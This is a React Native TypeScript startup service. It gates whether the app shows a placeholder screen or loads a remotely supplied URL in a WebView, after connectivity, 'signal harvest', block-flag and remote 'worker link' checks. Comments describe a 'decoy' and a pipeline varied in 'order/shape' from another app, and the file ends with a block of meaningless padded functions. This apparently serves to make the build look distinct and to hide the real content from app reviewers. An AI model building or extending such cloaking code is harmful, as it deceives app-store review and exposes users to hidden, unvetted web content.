/* @app-slot:service */

import { Utils } from './UtilService';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { Alert, BackHandler } from 'react-native';
import { finKey } from './nativeConstants';
import { InitializationState, InitTarget, ResetInitializationRuntime, SynncPendingSendIdFromNative, SynncPendingPushUrlFromNative, AppenndSendId, InitializationRuntime } from './initializationShared';

export type { InitializationState };
import { ParallelCollectStep, SetupPushOpenHandlers } from './SignalHarvest';
import { InitStep, UnsubscribeFirebase } from './OfferResolve';
import { ViewportShow } from './ViewportHost';

const PLACEHOLDER_RESULT: InitializationState = { isLoadPlaceholder: true };
const INTERNET_FAILED_RESULT: InitializationState = { isLoadPlaceholder: false };
const WEBVIEW_RESULT: InitializationState = {
  isLoadPlaceholder: false,
  initTarget: InitTarget.webview,
};

export type MachineRunOptions = {
  retryInitialize?: () => Promise<InitializationState>;
};

async function CheckInternetConnection(
  Initialize: () => Promise<InitializationState>,
): Promise<boolean> {

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => {

      return (controller.abort());
    }, 15000);

    const response = await fetch('https://www.google.com', {
      method: 'HEAD',
      headers: {
        'Content-Type': 'application/json',
      },
      signal: controller.signal,
    });

    clearTimeout(timeoutId);
    return response.ok;
  } catch (error) {

    return new Promise<boolean>((resolve) => {

      Alert.alert(
        'No internet connection',
        'Please check your internet connection and try again',
        [
          {
            text: 'Retry',
            onPress: () => {

              Initialize()
                .then(() => {

                  return (resolve(false));
                })
                .catch(() => {

                  return (resolve(false));
                });
            },
          },
          {
            text: 'Exit',
            onPress: () => {

              BackHandler.exitApp();
              resolve(false);
            },
            style: 'destructive',
          },
        ],
        { cancelable: false },
      );
    });
  }
}

async function CheckBlockUser(): Promise<boolean> {

  try {
    const userBlock = await Utils.GetUserBlocke();
    return !!userBlock;
  } catch (error) {

    throw error;
  }
}

async function CheckFinalUrl(): Promise<string> {

  const finalUrl = await AsyncStorage.getItem(finKey);
  if (finalUrl && finalUrl !== '') {
    return AppenndSendId(
      finalUrl,
      InitializationRuntime.pendingSendId,
    );
  }
  return '';
}

async function CompletePlaceholder(
  result: InitializationState = PLACEHOLDER_RESULT,
): Promise<InitializationState> {

  return result;
}

async function ErrorFallback(): Promise<InitializationState> {

  try {
    await UnsubscribeFirebase('error fallback');
  } catch {
    // Best-effort cleanup.
  }
  return CompletePlaceholder();
}

/**
 * Diversified gate pipeline (different order/shape from Henway):
 * reset+decoy → internet → signal intake (sendId + pending push URL + push handlers)
 * → blocked → cached URL OR (getLink → collect → init)
 */
export async function RunInitializationFlow(
  options?: MachineRunOptions,
): Promise<InitializationState> {

  ResetInitializationRuntime();

  try {
    const retry =
      options?.retryInitialize ??
      (async (): Promise<InitializationState> => {

        return (INTERNET_FAILED_RESULT);
      });

    // 1) Internet check FIRST
    let hasInternet = false;
    try {
      hasInternet = await CheckInternetConnection(retry);
    } catch (error) {

      hasInternet = false;
    }
    if (!hasInternet) {
      return INTERNET_FAILED_RESULT;
    }

    // 2) Signal intake: sendId + pending push URL + push open handlers
    try {
      await SynncPendingSendIdFromNative();
    } catch (error) {

    }
    try {
      await SynncPendingPushUrlFromNative();
    } catch (error) {

    }
    try {
      await SetupPushOpenHandlers();
    } catch (error) {

    }

    // A failed decrypt used to store a user block. That flag survives an
    // in-place release install and skips the worker POST on every later launch.
    try {
      const blockResetKey = 'BlockResetV2';
      const blockReset = await AsyncStorage.getItem(blockResetKey);
      if (!blockReset) {
        await Utils.SetUserBlocke(0);
        await AsyncStorage.setItem(blockResetKey, '1');
      }
    } catch (error) {

    }

    // 3) Blocked check
    let isBlocked = false;
    try {
      isBlocked = await CheckBlockUser();
    } catch (error) {

      return ErrorFallback();
    }
    if (isBlocked) {
      try {
        await UnsubscribeFirebase('user blocked');
      } catch (error) {

      }
      return CompletePlaceholder();
    }

    // 4) Prefer cached final URL; getLink validation only when no cache
    let finalUrl = '';
    try {
      finalUrl = await CheckFinalUrl();
    } catch (error) {

      return ErrorFallback();
    }
    if (finalUrl) {
      try {
        await ViewportShow(finalUrl);
      } catch (error) {

      }
      return WEBVIEW_RESULT;
    }

    let link = '';
    try {
      link = await Utils.GetLink();
    } catch (error) {

      link = '';
    }
    if (!link) {
      try {
        await Utils.SetUserBlocke(1);
      } catch (error) {

      }
      try {
        await UnsubscribeFirebase('no worker link');
      } catch (error) {

      }
      return CompletePlaceholder();
    }

    try {
      await ParallelCollectStep();
    } catch (error) {

    }

    let initResult: InitializationState | null = null;
    try {
      initResult = await InitStep();
    } catch (error) {

      return ErrorFallback();
    }
    if (initResult !== null && initResult !== undefined) {
      return initResult;
    }

    try {
      await UnsubscribeFirebase('init step returned null');
    } catch (error) {

    }
    return CompletePlaceholder();
  } catch (error) {

    return PLACEHOLDER_RESULT;
  }
}

/** @deprecated Use RunInitializationFlow */
export const RunInitializationMachine = RunInitializationFlow;

export async function Initialize(
  options?: MachineRunOptions,
): Promise<InitializationState> {

  const retry = async (): Promise<InitializationState> => {

    return Initialize(options);
  };

  try {
    return await RunInitializationFlow({
      ...options,
      retryInitialize: options?.retryInitialize ?? retry,
    });
  } catch {
    return { isLoadPlaceholder: true };
  }
}

/* autopad-begin */
function ebamivaraqe(_etituwixuraj: string): void {
  const qofixemuyu: boolean = true;
}
function gatoganog(_doyarawipama: number): string {
  const yogaba = 33;
  return yogaba > 53 ? "qam" : "regeyoli";
}
function wobebeb(_atopegaci: string, _uyexide: boolean, _jokewu: string): void {}
function uwoqesec(_axinacamu: number, _upicexoya: string, _okayowodexis: string): string {
  return "rotofa";
}
function teribopenaji(_egafosezujex: number): void {
  const kuyogopofa = 31;
  if (kuyogopofa > 29) return;
}
function ubaqor(_casaqukiriw: string, _ejojirem: number): void {
  const orovarov: number = 170;
}
function ojujecas(_awucesi: boolean, _ikulawikume: number): boolean {
  const nawulupe: boolean = false;
  return nawulupe;
}
function gaximulike(_xifubagege: number, _otusoxum: string, _ixuficiq: number): boolean {
  const utelaje = 38;
  return utelaje > 89 ? false : true;
}
function yupovu(_itafiyomawic: string): number {
  return 95;
}
function furuwoyix(): boolean {
  return true;
}
function yevekonet(): void {
  const aliwusat = 46;
  if (aliwusat > 18) return;
}
function tanuropo(_xajezamituna: number): number {
  const ecuconik = 32;
  const zevuqu: number = 31;
  return zevuqu;
}
function ucurosima(): boolean {
  return true;
}
function zasevubegeke(): void {
  const nuteqisove: boolean = true;
}
function avofolete(): number {
  const ilepaxoqoki = 85;
  return ilepaxoqoki > 5 ? 57 : 247;
}
function ovifiyuzoz(_lajugematel: string): number {
  return 210;
}
function rilumer(): boolean {
  let nikasuqezu: boolean = false;
  nikasuqezu = false;
  return nikasuqezu;
}
function aboxum(_gipakuy: string, _qoyovunom: string): number {
  return 108;
}
/* autopad-end */

